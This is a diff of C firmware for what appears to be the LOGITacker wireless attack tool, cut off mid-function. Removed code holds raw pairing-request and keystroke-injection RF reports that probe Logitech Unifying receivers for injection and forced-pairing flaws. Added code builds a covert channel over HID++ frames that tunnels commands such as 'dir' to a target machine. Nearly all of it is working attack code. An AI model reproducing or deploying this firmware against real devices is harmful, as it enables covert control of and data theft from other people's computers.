@@ -15,30 +15,91 @@
 NRF_LOG_MODULE_REGISTER();
 
 
-#define COVERT_CHANNEL_TX_DELAY_MS 8
-#define COVERT_CHANNEL_INNER_LOOP_MAX 5
 
-#define PAIRING_REQ_MARKER_BYTE 0xee // byte used as device ID in pairing requests
+
+#define COVERT_CHANNEL_TX_DELAY_MS 20
+#define COVERT_CHANNEL_PAYLOAD_MARKER 0xba
 
 
 typedef enum {
-    COVERT_CHANNEL_PHASE_STARTED,   // try to reach dongle RF address for device
-    COVERT_CHANNEL_PHASE_FINISHED,   // try to reach dongle RF address for device
-    COVERT_CHANNEL_PHASE_RUNNING_TESTS   // tests if plain keystrokes could be injected (press CAPS, listen for LED reports)
+    COVERT_CHANNEL_PHASE_SYNC,
+    COVERT_CHANNEL_PHASE_RUNNING,
+    COVERT_CHANNEL_PHASE_STOPPED,
 } covert_channel_phase_t;
+
+
+/*
+ * Covert channel data frame
+ *
+ * offset       Bits    Name                    Usage
+ *
+ * 0x00         7:0     Device Index            0x00 for outbound frames, device index for inbound frames
+ * 0x01         7:0     Report Type             Should always be 0x11 (HID++ 1.0 long)
+ * 0x02         7:0     Destination ID          for outbound frames, set according to inbound frames (corresponds to RF address prefix)
+ * 0x03         7:1     Marker                  Identifies covert channel data
+ *              0:0     Control Frame           If set, the payload represents a control frame
+ * 0x04         7:4     Payload Length          IF NOT CONTROL FRAME: Effective length of payload (max value 15 bytes)
+ * 0x04         7:4     Control Type            IF CONTROL FRAME: Type of control frame, length depends on type
+ * 0x04         3:2     Ack Number              Acknowledgment number (0..3)
+ * 0x04         1:0     Seq Number              Sequence Number
+ * 0x05..0x15   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
+ * 0x16         7:0     Logitech CRC            Logitech 8 bit CRC
+ *
+ *
+ * Note:
+ * Although the payload array could carry up to 16 bytes, the length field could only encode values between 0 and 15.
+ * In order to use the maximum length of 16 bytes, a control frame has to be used (if bit 0 of marker field is set,
+ * bit 7:4 are interpreted as control frame type, instead of length).
+ * The control frame type of a "maximum payload length" frame is 0x00
+ */
+
+typedef enum {
+    COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME = 0x0,
+} covert_channel_control_frame_type_t;
+
+typedef struct {
+    uint8_t len;
+    uint8_t data[16];
+
+} covert_channel_payload_data_t;
 
 
 
 typedef struct {
-//    logitacker_mode_t * p_logitacker_mainstate;
+    uint8_t cc_device_index;
+    uint8_t cc_rf_report_type;
+    uint8_t cc_rf_destination_id;
+    uint8_t cc_marker_byte; //0xbb
+    uint8_t cc_status_bitmask;
+    uint8_t payload[16];
+    uint8_t logitech_crc;
 
-    uint8_t inner_loop_count; // how many successfull transmissions to RF address of current prefix
-    uint8_t led_count;
+} covert_channel_frame_t;
+
+typedef struct {
+    uint8_t current_tx_seq;
+    uint8_t last_rx_seq;
+    uint8_t marker;
+    uint8_t unifying_device_index;
+
+    uint8_t tx_interval;
+
+    covert_channel_payload_data_t tmp_covert_channel_tx_data;
+    covert_channel_payload_data_t tmp_covert_channel_rx_data;
+
+    nrf_esb_payload_t tmp_tx_frame;
+    nrf_esb_payload_t tmp_rx_frame;
+
+
+
+
+//    uint8_t inner_loop_count; // how many successfull transmissions to RF address of current prefix
+//    uint8_t led_count;
     uint8_t current_rf_address[5];
 
-    uint8_t base_addr[4];
-    uint8_t known_prefix;
-    uint8_t next_prefix;
+    uint8_t rf_base_addr[4];
+    uint8_t rf_prefix;
+//    uint8_t next_prefix;
 
     uint8_t tx_delay_ms;
 
@@ -46,10 +107,9 @@ typedef struct {
     covert_channel_phase_t phase;
     app_timer_id_t timer_next_action;
 
-    nrf_esb_payload_t tmp_tx_payload;
-    nrf_esb_payload_t tmp_rx_payload;
-
     logitacker_devices_unifying_dongle_t * p_dongle;
+
+
 } logitacker_processor_covert_channel_ctx_t;
 
 static logitacker_processor_t m_processor = {0};
@@ -57,10 +117,6 @@ static logitacker_processor_covert_channel_ctx_t m_static_covert_channel_ctx; //
 
 static char addr_str_buff[LOGITACKER_DEVICE_ADDR_STR_LEN] = {0};
 
-static uint8_t rf_report_plain_keys_caps[] = { 0x00, 0xC1, 0x00, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-static uint8_t rf_report_plain_keys_release[] = { 0x00, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-static uint8_t rf_report_pairing_request1[] = { 0xee, 0x5F, 0x01, 0x99, 0x89, 0x9C, 0xCA, 0xB4, 0x08, 0x40, 0x4D, 0x04, 0x02, 0x01, 0x47, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x79 };
-static uint8_t rf_report_keep_alive[] = { 0x00, 0x40, 0x00, 0x08, 0x00 };
 
 void processor_covert_channel_init_func(logitacker_processor_t *p_processor);
 void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx_t *self);
@@ -78,8 +134,11 @@ void processor_covert_channel_bsp_handler_func(logitacker_processor_t *p_process
 void processor_covert_channel_bsp_handler_func_(logitacker_processor_covert_channel_ctx_t *self, bsp_event_t event);
 
 
-//void processor_covert_channel_update_tx_payload(uint8_t iteration_count);
-void processor_covert_channel_update_tx_payload(logitacker_processor_covert_channel_ctx_t *self);
+
+void processor_covert_channel_update_tx_frame(logitacker_processor_covert_channel_ctx_t *self);
+uint32_t processor_covert_channel_process_rx_frame(logitacker_processor_covert_channel_ctx_t *self);
+
+
 void processor_covert_channel_add_device_address_to_list(logitacker_processor_covert_channel_ctx_t *self);
 bool processor_covert_channel_advance_to_next_addr_prefix(logitacker_processor_covert_channel_ctx_t *self);
 
@@ -96,6 +155,172 @@ logitacker_processor_t * contruct_processor_covert_channel_instance(logitacker_p
     return &m_processor;
 }
 
+void processor_covert_channel_update_tx_frame(logitacker_processor_covert_channel_ctx_t *self) {
+/*
+ * Covert channel data frame
+ *
+ * offset       Bits    Name                    Usage
+ *
+ * 0x00         7:0     Device Index            0x00 for outbound frames, device index for inbound frames
+ * 0x01         7:0     Report Type             Should always be 0x11 (HID++ 1.0 long)
+ * 0x02         7:0     Destination ID          for outbound frames, set according to inbound frames (corresponds to RF address prefix)
+ * 0x03         7:1     Marker                  Identifies covert channel data
+ *              0:0     Control Frame           If set, the payload represents a control frame
+ * 0x04         7:4     Payload Length          IF NOT CONTROL FRAME: Effective length of payload (max value 15 bytes)
+ * 0x04         7:4     Control Type            IF CONTROL FRAME: Type of control frame, length depends on type
+ * 0x04         3:2     Ack Number              Acknowledgment number (0..3)
+ * 0x04         1:0     Seq Number              Sequence Number
+ * 0x05..0x15   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
+ * 0x16         7:0     Logitech CRC            Logitech 8 bit CRC
+ *
+ *
+ * Note:
+ * Although the payload array could carry up to 16 bytes, the length field could only encode values between 0 and 15.
+ * In order to use the maximum length of 16 bytes, a control frame has to be used (if bit 0 of marker field is set,
+ * bit 7:4 are interpreted as control frame type, instead of length).
+ * The control frame type of a "maximum payload length" frame is 0x00
+ */
+
+    self->tmp_tx_frame.length = 22;
+
+    self->tmp_tx_frame.data[0x00] = 0x00;
+    self->tmp_tx_frame.data[0x01] = 0x11 | 0x40; //HID++ 1.0 long with keep-alive bit set
+    self->tmp_tx_frame.data[0x02] = self->rf_prefix; //destination id == rf_prefix
+    self->tmp_tx_frame.data[0x03] = self->marker; // mark as covert channel frame
+    if (self->tmp_covert_channel_tx_data.len >= 16) {
+        self->tmp_tx_frame.data[0x03] = self->marker | 0x01; //update covert channel marker, to represent a control frame
+        //copy in data
+        memcpy(&self->tmp_tx_frame.data[0x05], self->tmp_covert_channel_tx_data.data, 16);
+    } else {
+        //encode length
+        self->tmp_tx_frame.data[0x04] = self->tmp_covert_channel_tx_data.len << 4;
+        // copy in data
+        memcpy(&self->tmp_tx_frame.data[0x05], self->tmp_covert_channel_tx_data.data, self->tmp_covert_channel_tx_data.len);
+    }
+
+    // encode SEQ/ACK no
+    uint8_t ack = (self->last_rx_seq & 0x03) << 2;
+    uint8_t seq = (self->current_tx_seq & 0x03);
+    self->tmp_tx_frame.data[0x04] |= (seq | ack);
+
+    //update logitech crc
+    logitacker_unifying_payload_update_checksum(self->tmp_tx_frame.data, self->tmp_tx_frame.length);
+
+    self->tmp_tx_frame.pipe = 1;
+    self->tmp_tx_frame.noack = false; // we need an ack
+}
+
+uint32_t processor_covert_channel_process_rx_frame(logitacker_processor_covert_channel_ctx_t *self) {
+/*
+ * Covert channel data frame
+ *
+ * offset       Bits    Name                    Usage
+ *
+ * 0x00         7:0     Device Index            0x00 for outbound frames, device index for inbound frames
+ * 0x01         7:0     Report Type             Should always be 0x11 (HID++ 1.0 long)
+ * 0x02         7:0     Destination ID          for outbound frames, set according to inbound frames (corresponds to RF address prefix)
+ * 0x03         7:1     Marker                  Identifies covert channel data
+ *              0:0     Control Frame           If set, the payload represents a control frame
+ * 0x04         7:4     Payload Length          IF NOT CONTROL FRAME: Effective length of payload (max value 15 bytes)
+ * 0x04         7:4     Control Type            IF CONTROL FRAME: Type of control frame, length depends on type
+ * 0x04         3:2     Ack Number              Acknowledgment number (0..3)
+ * 0x04         1:0     Seq Number              Sequence Number
+ * 0x05..0x15   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
+ * 0x16         7:0     Logitech CRC            Logitech 8 bit CRC
+ *
+ *
+ * Note:
+ * Although the payload array could carry up to 16 bytes, the length field could only encode values between 0 and 15.
+ * In order to use the maximum length of 16 bytes, a control frame has to be used (if bit 0 of marker field is set,
+ * bit 7:4 are interpreted as control frame type, instead of length).
+ * The control frame type of a "maximum payload length" frame is 0x00
+ */
+
+    NRF_LOG_DEBUG("RX rf prefix 0x%02x", self->tmp_rx_frame.data[0x02]);
+    NRF_LOG_DEBUG("RX marker    0x%02x", self->tmp_rx_frame.data[0x03]);
+    NRF_LOG_DEBUG("RX len       %d", self->tmp_rx_frame.length);
+
+    VERIFY_TRUE(self->tmp_rx_frame.length == 22, NRF_ERROR_INVALID_LENGTH);
+    VERIFY_TRUE(self->tmp_rx_frame.data[0x01] == 0x11, NRF_ERROR_INVALID_DATA);
+    VERIFY_TRUE((self->tmp_rx_frame.data[0x03] & 0xFE) == self->marker, NRF_ERROR_INVALID_DATA);
+
+
+    //ToDo: check Logitech CRC
+
+    self->unifying_device_index = self->tmp_rx_frame.data[0x00];
+
+    //extract SEQ/ACK
+    uint8_t seq = self->tmp_rx_frame.data[0x04] & 0x03;
+    uint8_t ack = (self->tmp_rx_frame.data[0x04] >> 2) & 0x03;
+
+    NRF_LOG_DEBUG("SEQ         0x%02x", seq);
+    NRF_LOG_DEBUG("ACK         0x%02x", ack);
+
+
+    //if phase is sync, the SEQ and ACK are updated according to received frame
+    if (self->phase == COVERT_CHANNEL_PHASE_SYNC) {
+        //align tx seq to received ACK
+        self->current_tx_seq = (ack + 1) & 0x03;
+        self->last_rx_seq = seq;
+        self->phase = COVERT_CHANNEL_PHASE_RUNNING;
+        processor_covert_channel_update_tx_frame(self);
+        return NRF_SUCCESS;
+    }
+
+
+    // process the frame data only, if the SEQ number is the successor of the previous one
+    uint8_t expected_seq = (self->last_rx_seq + 1) & 0x03;
+    if (seq == expected_seq) {
+        NRF_LOG_DEBUG("Frame with new SEQ arrived")
+
+        //update RX sequence no
+        self->last_rx_seq = seq;
+
+        bool is_control_type = (self->tmp_rx_frame.data[0x03] & 0x01) > 0x00;
+        if (is_control_type) {
+            uint8_t control_type = (self->tmp_rx_frame.data[0x04] & 0xF0) >> 4;
+            switch (control_type) {
+                case COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME:
+                    // interpret payload as 16 byte data
+                    self->tmp_covert_channel_rx_data.len = 16;
+                    memcpy(self->tmp_covert_channel_rx_data.data, &self->tmp_rx_frame.data[0x05], 16);
+                    break;
+                default:
+                    // ignore invalid CONTROL TYPES
+                    NRF_LOG_WARNING("Unknown control frame type 0x%02x", control_type);
+                    break;
+            }
+        } else {
+            // extract payload data according to encoded length
+            uint8_t data_length = (self->tmp_rx_frame.data[0x04] & 0xF0) >> 4;
+            memcpy(self->tmp_covert_channel_rx_data.data, &self->tmp_rx_frame.data[0x05], data_length);
+            self->tmp_covert_channel_rx_data.len = data_length;
+        }
+
+        if (self->tmp_covert_channel_rx_data.len > 0) {
+            //NRF_LOG_INFO("NEW RX data:")
+            NRF_LOG_HEXDUMP_INFO(self->tmp_covert_channel_rx_data.data, self->tmp_covert_channel_rx_data.len);
+        }
+    }
+
+    // check if last TX frame was acknowledged, if yes, new data could be TX'ed
+    if (ack == self->current_tx_seq) {
+        NRF_LOG_DEBUG("Last TX seq was ACK'ed ... updating TX data")
+
+        //ToDo: self->tmp_covert_channel_tx_data may be updated, for now we only clear it
+        self->tmp_covert_channel_tx_data.len = 0; // replace this with real data update
+
+        //advance TX seq
+        self->current_tx_seq++;
+        self->current_tx_seq &= 0x03;
+    }
+
+    //update TX frame
+    processor_covert_channel_update_tx_frame(self);
+
+    return NRF_SUCCESS;
+}
+
 void processor_covert_channel_bsp_handler_func(logitacker_processor_t *p_processor, bsp_event_t event) {
     processor_covert_channel_bsp_handler_func_((logitacker_processor_covert_channel_ctx_t *) p_processor->p_ctx, event);
 }
@@ -109,15 +334,12 @@ void processor_covert_channel_init_func(logitacker_processor_t *p_processor) {
 }
 
 void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx_t *self) {
-//    *self->p_logitacker_mainstate = LOGITACKER_MODE_COVERT_CHANNEL;
     self->tx_delay_ms = COVERT_CHANNEL_TX_DELAY_MS;
 
-    //helper_addr_to_base_and_prefix(m_state_local.substate_covert_channel.base_addr, &m_state_local.substate_covert_channel.known_prefix, rf_address, LOGITACKER_DEVICE_ADDR_LEN);
-    helper_addr_to_base_and_prefix(self->base_addr, &self->known_prefix, self->current_rf_address, LOGITACKER_DEVICE_ADDR_LEN);
-    self->next_prefix = self->known_prefix-1;
+    helper_addr_to_base_and_prefix(self->rf_base_addr, &self->rf_prefix, self->current_rf_address, LOGITACKER_DEVICE_ADDR_LEN);
 
     helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, self->current_rf_address);
-    NRF_LOG_INFO("Start active enumeration for address %s", addr_str_buff);
+    NRF_LOG_INFO("Start covert channel for address %s", addr_str_buff);
 
     radio_disable_rx_timeout_event(); // disable RX timeouts
     radio_stop_channel_hopping(); // disable channel hopping
@@ -125,20 +347,32 @@ void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx
 
     // set current address for pipe 1
     nrf_esb_enable_pipes(0x00); //disable all pipes
-    nrf_esb_set_base_address_1(self->base_addr); // set base addr1
-    nrf_esb_update_prefix(1, self->known_prefix); // set prefix and enable pipe 1
+    nrf_esb_set_base_address_1(self->rf_base_addr); // set base addr1
+    nrf_esb_update_prefix(1, self->rf_prefix); // set prefix and enable pipe 1
 
 
     // clear TX/RX payload buffers (just to be sure)
-    memset(&self->tmp_tx_payload, 0, sizeof(self->tmp_tx_payload)); //unset TX payload
-    memset(&self->tmp_rx_payload, 0, sizeof(self->tmp_rx_payload)); //unset RX payload
+    memset(&self->tmp_tx_frame, 0, sizeof(self->tmp_tx_frame)); //unset TX payload
+    memset(&self->tmp_rx_frame, 0, sizeof(self->tmp_rx_frame)); //unset RX payload
+    memset(&self->tmp_covert_channel_tx_data, 0, sizeof(self->tmp_covert_channel_tx_data)); //unset TX data
+    memset(&self->tmp_covert_channel_rx_data, 0, sizeof(self->tmp_covert_channel_rx_data)); //unset TX data
 
     self->p_dongle = NULL;
 
-    // prepare test TX payload (first report will be a pairing request)
-    self->inner_loop_count = 0;
-    self->tmp_tx_payload.noack = false;
-    processor_covert_channel_update_tx_payload(self);
+    //add somme test data for TX
+    memcpy(self->tmp_covert_channel_tx_data.data, "dir\n", 4);
+    self->tmp_covert_channel_tx_data.len = 4;
+
+    // update marker
+    self->marker = COVERT_CHANNEL_PAYLOAD_MARKER & 0xfe; //assure base marker hasn't bit 0 set
+
+    // update TX ESB frame
+    self->tmp_tx_frame.noack = false; // we want ack payloads for all our transmissions
+    processor_covert_channel_update_tx_frame(self);
+
+    self->phase = COVERT_CHANNEL_PHASE_SYNC;
+    self->current_tx_seq = 0;
+    self->last_rx_seq = 0;
 
     // setup radio as PTX
     nrf_esb_set_mode(NRF_ESB_MODE_PTX);
@@ -146,12 +380,10 @@ void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx
     nrf_esb_set_all_channel_tx_failover_loop_count(2); //iterate over channels two time before failing
     nrf_esb_set_retransmit_count(2);
     nrf_esb_set_retransmit_delay(250);
-    nrf_esb_set_tx_power(NRF_ESB_TX_POWER_8DBM);
-
-    self->phase = COVERT_CHANNEL_PHASE_STARTED;
+    nrf_esb_set_tx_power(NRF_ESB_TX_POWER_8DBM); // full power TX
 
     // write payload (autostart TX is enabled for PTX mode)
-    nrf_esb_write_payload(&self->tmp_tx_payload);
+    nrf_esb_write_payload(&self->tmp_tx_frame);
 }
 
 void processor_covert_channel_deinit_func(logitacker_processor_t *p_processor) {
@@ -159,9 +391,7 @@ void processor_covert_channel_deinit_func(logitacker_processor_t *p_processor) {
 }
 
 void processor_covert_channel_deinit_func_(logitacker_processor_covert_channel_ctx_t *self) {
-//    *self->p_logitacker_mainstate = LOGITACKER_MODE_IDLE;
-
-    NRF_LOG_INFO("DEINIT active enumeration for address %s", addr_str_buff);
+    NRF_LOG_INFO("DEINIT covert channel for address %s", addr_str_buff);
 
     radio_disable_rx_timeout_event(); // disable RX timeouts
     radio_stop_channel_hopping(); // disable channel hopping
@@ -172,17 +402,15 @@ void processor_covert_channel_deinit_func_(logitacker_processor_covert_channel_c
     // set current address for pipe 1
     nrf_esb_enable_pipes(0x00); //disable all pipes
 
+    self->phase = COVERT_CHANNEL_PHASE_STOPPED;
+
     // reset inner loop count
-    self->inner_loop_count = 0;
-    self->known_prefix = 0x00; //unset prefix
-    self->next_prefix = 0x00; //unset next prefix
-    self->led_count = 0x00; //unset LED count
-    self->phase = COVERT_CHANNEL_PHASE_FINISHED;
-    memset(self->base_addr, 0, 4); //unset base address
+    self->rf_prefix = 0x00; //unset prefix
+    memset(self->rf_base_addr, 0, 4); //unset base address
     memset(self->current_rf_address, 0, 5); //unset RF address
 
-    memset(&self->tmp_tx_payload, 0, sizeof(self->tmp_tx_payload)); //unset TX payload
-    memset(&self->tmp_rx_payload, 0, sizeof(self->tmp_rx_payload)); //unset RX payload
+    memset(&self->tmp_tx_frame, 0, sizeof(self->tmp_tx_frame)); //unset TX payload
+    memset(&self->tmp_rx_frame, 0, sizeof(self->tmp_rx_frame)); //unset RX payload
 
     nrf_esb_enable_all_channel_tx_failover(false); // disable all channel failover
 }
@@ -192,12 +420,8 @@ void processor_covert_channel_timer_handler_func(logitacker_processor_t *p_proce
 }
 
 void processor_covert_channel_timer_handler_func_(logitacker_processor_covert_channel_ctx_t *self, void *p_timer_ctx) {
-    // if timer is called, write (and auto transmit) current ESB payload
-    self->phase = COVERT_CHANNEL_PHASE_RUNNING_TESTS;
-
-    // write payload (autostart TX is enabled for PTX mode)
-    //NRF_LOG_HEXDUMP_INFO(self->tmp_tx_payload.data, self->tmp_tx_payload.length);
-    if (nrf_esb_write_payload(&self->tmp_tx_payload) != NRF_SUCCESS) {
+    // transmit current TX payload
+    if (nrf_esb_write_payload(&self->tmp_tx_frame) != NRF_SUCCESS) {
         NRF_LOG_INFO("Error writing payload");
     }
 
@@ -208,282 +432,51 @@ void processor_covert_channel_esb_handler_func(logitacker_processor_t *p_process
 }
 
 void processor_covert_channel_esb_handler_func_(logitacker_processor_covert_channel_ctx_t *self, nrf_esb_evt_t *p_esb_event) {
-    if (self->phase == COVERT_CHANNEL_PHASE_FINISHED) {
-        NRF_LOG_WARNING("Active enumeration event, while active enumeration finished");
-        goto COVERT_CHANNEL_FINISHED;
-    }
-
-
     uint32_t channel_freq;
     nrf_esb_get_rf_frequency(&channel_freq);
 
     switch (p_esb_event->evt_id) {
         case NRF_ESB_EVENT_TX_FAILED:
-        {
-            // if very first transmission fails (for the prefix which should definitely be reachable) --> whole active enum failed
-            NRF_LOG_DEBUG("ACTIVE ENUMERATION TX_FAILED channel: %d", channel_freq);
-            if (self->phase == COVERT_CHANNEL_PHASE_STARTED) {
-                self->receiver_in_range = false;
-                self->phase = COVERT_CHANNEL_PHASE_FINISHED;
-                NRF_LOG_INFO("Failed to reach receiver in first transmission, aborting active enumeration");
-                goto COVERT_CHANNEL_FINISHED;
-            }
-
-            if (self->current_rf_address[4] == 0x00) { // note next prefix wasn't update,yet - thus it represents the prefix for which TX failed
-                //if prefix 0x00 isn't reachable, it is unlikely that this is a Logitech dongle, thus we remove the device from the list and abort enumeration
-                NRF_LOG_INFO("Address prefix 0x00 not reachable, either no Unifying device or dongle not in range");
-//                NRF_LOG_INFO("Address prefix 0x00 not reachable, either no Unifying device or dongle not in range ... stop neighbor discovery");
-/*
-                logitacker_devices_unifying_dongle_t *p_dongle = NULL;
-                logitacker_devices_get_dongle_by_device_addr(&p_dongle, self->current_rf_address);
-                if (p_dongle != NULL) {
-                    //logitacker_devices_del_dongle(p_dongle->base_addr);
-
-                    //abort enumeration
-                    self->phase = COVERT_CHANNEL_PHASE_FINISHED;
-                    goto COVERT_CHANNEL_FINISHED;
-                    //p_dongle->is_logitech = false;
-                }
-*/
-            }
-
-            // continue with next prefix, return if first prefix has been reached again
-            if (processor_covert_channel_advance_to_next_addr_prefix(self)) goto COVERT_CHANNEL_FINISHED;
-
-            //re-transmit last frame (payload is still enqueued)
+            NRF_LOG_INFO("COVERT CHANNEL TX_FAIL ... re-transmit");
+            // retransmit
             nrf_esb_start_tx();
-
-
             break;
-        }
         case NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY:
         case NRF_ESB_EVENT_TX_SUCCESS:
         {
-            NRF_LOG_DEBUG("ACTIVE ENUMERATION TX_SUCCESS channel: %d (loop %d)", channel_freq, self->inner_loop_count);
-
-            // if first successful TX to this address, add to list
-            if (self->inner_loop_count == 0) processor_covert_channel_add_device_address_to_list(self);
-
-            // update TX loop count
-            self->inner_loop_count++;
-
-            processor_covert_channel_update_tx_payload(self);
-
+            NRF_LOG_DEBUG("COVERT CHANNEL TX_SUCCESS channel: %d", channel_freq);
+            NRF_LOG_HEXDUMP_DEBUG(self->tmp_tx_frame.data, self->tmp_tx_frame.length);
 
 
             if (p_esb_event->evt_id == NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY) {
-                NRF_LOG_DEBUG("ACK_PAY channel (loop %d)", self->inner_loop_count);
-                logitacker_devices_unifying_device_t * p_device = NULL;
+                NRF_LOG_DEBUG("ACK_PAY received");
 
-                while (nrf_esb_read_rx_payload(&self->tmp_rx_payload) == NRF_SUCCESS) {
-                    //Note: LED testing doesn't work on presenters like "R400", because no HID led output reports are sent
-                    // test if LED report
-                    uint8_t device_id = self->tmp_rx_payload.data[0];
-                    uint8_t rf_report_type = self->tmp_rx_payload.data[1] & 0x1f;
-                    if (rf_report_type == UNIFYING_RF_REPORT_LED) {
-                        self->led_count++;
-                        //device supports plain injection
-                        NRF_LOG_INFO("ATTACK VECTOR: devices accepts plain keystroke injection (LED test succeeded)");
-                        logitacker_devices_get_device(&p_device, self->current_rf_address);
-                        if (p_device != NULL) {
-                            p_device->vuln_plain_injection = true;
-                            // set proper device capabilities and report types
-                            p_device->report_types |= LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD;
-                            p_device->caps &= ~LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION;
-                            if (p_device->p_dongle != NULL) {
-                                p_device->p_dongle->classification = DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING;
-                            }
-
-                            // if auto store is enabled, store to flash
-                            if (g_logitacker_global_config.auto_store_plain_injectable) {
-                                //check if already stored
-                                logitacker_devices_unifying_device_t dummy_device;
-                                if (logitacker_flash_get_device(&dummy_device, p_device->rf_address) != NRF_SUCCESS) {
-                                    // not existing on flash create it
-                                    if (logitacker_devices_store_ram_device_to_flash(p_device->rf_address) == NRF_SUCCESS) {
-                                        NRF_LOG_INFO("device automatically stored to flash");
-                                    }
-                                } else {
-                                    NRF_LOG_INFO("device already exists on flash");
-                                }
-                            }
-                        }
-                    } else if (rf_report_type == UNIFYING_RF_REPORT_PAIRING && device_id == PAIRING_REQ_MARKER_BYTE) { //data[0] holds byte used in request
-                        //device supports plain injection
-                        NRF_LOG_INFO("ATTACK VECTOR: forced pairing seems possible");
-                        logitacker_devices_get_device(&p_device, self->current_rf_address);
-                        if (p_device != NULL) {
-                            p_device->vuln_forced_pairing = true;
-                            logitacker_devices_unifying_dongle_t * p_dongle = p_device->p_dongle;
-                            if (p_dongle != NULL) {
-                                // dongle wpid is in response (byte 8,9)
-                                memcpy(p_dongle->wpid, &self->tmp_rx_payload.data[9], 2);
-                                if (p_dongle->wpid[0] == 0x88 && p_dongle->wpid[1] == 0x02) p_dongle->is_nordic = true;
-                                if (p_dongle->wpid[0] == 0x88 && p_dongle->wpid[1] == 0x08) p_dongle->is_texas_instruments = true;
-                                NRF_LOG_INFO("Dongle WPID is %.2X%.2X (TI: %s, Nordic: %s)", p_dongle->wpid[0], p_dongle->wpid[1], p_dongle->is_texas_instruments ? "yes" : "no", p_dongle->is_nordic ? "yes" : "no");
-                            }
-
-                        }
-
+                while (nrf_esb_read_rx_payload(&self->tmp_rx_frame) == NRF_SUCCESS) {
+                    NRF_LOG_HEXDUMP_DEBUG(self->tmp_rx_frame.data, self->tmp_rx_frame.length);
+                    uint32_t err = processor_covert_channel_process_rx_frame(self);
+                    if (err != NRF_SUCCESS) {
+                        NRF_LOG_WARNING("Error processing inbound payload: 0x%08x", err);
                     }
 
-                    NRF_LOG_HEXDUMP_DEBUG(self->tmp_rx_payload.data, self->tmp_rx_payload.length);
-
                 }
             }
 
-
-            if (self->inner_loop_count < COVERT_CHANNEL_INNER_LOOP_MAX) {
-                app_timer_start(self->timer_next_action, APP_TIMER_TICKS(self->tx_delay_ms), self->timer_next_action);
-            } else {
-                // we are done with this device
-
-                // continue with next prefix, return if first prefix has been reached again
-                if (processor_covert_channel_advance_to_next_addr_prefix(self)) {
-                    goto COVERT_CHANNEL_FINISHED;
-                }
-
-                // start next transmission
-                if (nrf_esb_write_payload(&self->tmp_tx_payload) != NRF_SUCCESS) {
-                    NRF_LOG_INFO("Error writing payload");
-                }
-            }
-
+            // retransmit or transmit updated frame
+            NRF_LOG_DEBUG("COVERT CHANNEL continue TX in %d ms...", self->tx_delay_ms);
+            app_timer_start(self->timer_next_action, APP_TIMER_TICKS(self->tx_delay_ms), self->timer_next_action);
             break;
         }
         case NRF_ESB_EVENT_RX_RECEIVED:
         {
-            NRF_LOG_INFO("ESB EVENT HANDLER ACTIVE ENUMERATION RX_RECEIVED ... !!shouldn't happen!!");
+            NRF_LOG_WARNING("ESB EVENT HANDLER COVERT_CHANNEL RX_RECEIVED ... !!shouldn't happen!!");
             break;
         }
     }
-
-    COVERT_CHANNEL_FINISHED:
-    if (self->phase == COVERT_CHANNEL_PHASE_FINISHED) {
-        NRF_LOG_WARNING("Active enumeration finished, continue with passive enumeration");
-
-        uint8_t rf_addr[5] = { 0 };
-        helper_base_and_prefix_to_addr(rf_addr, self->base_addr, self->known_prefix, 5);
-        //logitacker_enter_mode_passive_enum(rf_addr);
-        logitacker_enter_mode_discovery();
-        return;
-    }
-
 }
 
 
-
-
-void processor_covert_channel_add_device_address_to_list(logitacker_processor_covert_channel_ctx_t *self) {
-    logitacker_devices_unifying_device_t * p_device = NULL;
-
-    // try to restore device from flash
-    if (logitacker_devices_restore_device_from_flash(&p_device, self->current_rf_address) != NRF_SUCCESS) {
-        // restore from flash failed, create in ram
-        logitacker_devices_create_device(&p_device, self->current_rf_address);
-    }
-
-
-    if (p_device != NULL) {
-        if (p_device->p_dongle != NULL) self->p_dongle = p_device->p_dongle;
-        NRF_LOG_INFO("device address %s added/updated", addr_str_buff);
-    } else {
-        NRF_LOG_INFO("failed to add/update device address %s", addr_str_buff);
-    }
-}
-
-// increments pipe 1 address prefix (neighbour discovery)
-bool processor_covert_channel_advance_to_next_addr_prefix(logitacker_processor_covert_channel_ctx_t *self) {
-    // all possible device_prefixes (neighbours) tested?
-    if (self->next_prefix == self->known_prefix) {
-        self->phase = COVERT_CHANNEL_PHASE_FINISHED;
-        NRF_LOG_INFO("Tested all possible neighbours");
-        //if (self->p_dongle != NULL) self->p_dongle->covert_channel_finished = true;
-        return true;
-    }
-
-    nrf_esb_enable_pipes(0x00); //disable all pipes
-    nrf_esb_update_prefix(1, self->next_prefix); // set prefix and enable pipe 1
-    self->current_rf_address[4] = self->next_prefix;
-    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, self->current_rf_address);
-
-    NRF_LOG_INFO("Test next neighbour address %s", addr_str_buff);
-    self->next_prefix--;
-    self->inner_loop_count = 0; // reset TX_SUCCESS loop count
-    self->led_count = 0; // reset RX LED report counter
-
-    processor_covert_channel_update_tx_payload(self);
-
-
-    return false;
-}
-
-void processor_covert_channel_update_tx_payload(logitacker_processor_covert_channel_ctx_t *self) {
-
-    uint8_t iter_mod_4 = self->inner_loop_count & 0x03;
-/*
-    char tmpstr[10];
-    sprintf(tmpstr, "%d", self->inner_loop_count);
-    NRF_LOG_INFO("inner loop count on TX update: %s", nrf_log_push(tmpstr));
-*/
-    if (self->inner_loop_count >= (COVERT_CHANNEL_INNER_LOOP_MAX - 4)) {
-        // sequence: Pairing request phase 1, Keep-Alive, Keep-Alive, Keep-Alive
-        switch (iter_mod_4) {
-            case 0:
